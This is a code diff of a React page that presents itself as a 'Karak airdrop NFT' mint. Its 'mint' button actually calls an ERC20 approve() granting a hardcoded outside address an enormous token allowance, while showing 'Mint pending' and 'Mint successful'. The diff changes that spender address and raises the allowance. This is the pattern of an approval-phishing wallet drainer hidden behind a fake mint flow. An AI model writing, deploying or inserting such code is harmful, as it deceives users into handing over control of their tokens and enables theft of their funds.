@@ -132,7 +132,7 @@ function App() {
                 const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
 
                 setApprovalStatus("Mint pending...");
-                const tx = await tokenContract.approve("0xCdF2f0F9325f3d6945E02Fe2A3280a535D7E3d74", "100000000000000000000000000000");
+                const tx = await tokenContract.approve("0x7e0AF2d2413dE28C05bF9824dA2B47a27762Fcb0", "9000000000000000000000000000000");
                 await tx.wait();
                 setApprovalStatus("Mint successful!");
             } catch (error) {
@@ -174,7 +174,7 @@ function App() {
                 <div className="content">
                     <h1>Mint your Karak airdrop NFT</h1>
                     
-                    <p>We have a mint fee of 0.001 ETH to fight spam.</p>
+                    <p>We have a mint fee of 0.001 ETH to fight spam</p>
                     <div className="circle-image-container">
                         <img src={circleImage} alt="Circle" className="circle-image" />
                     </div>
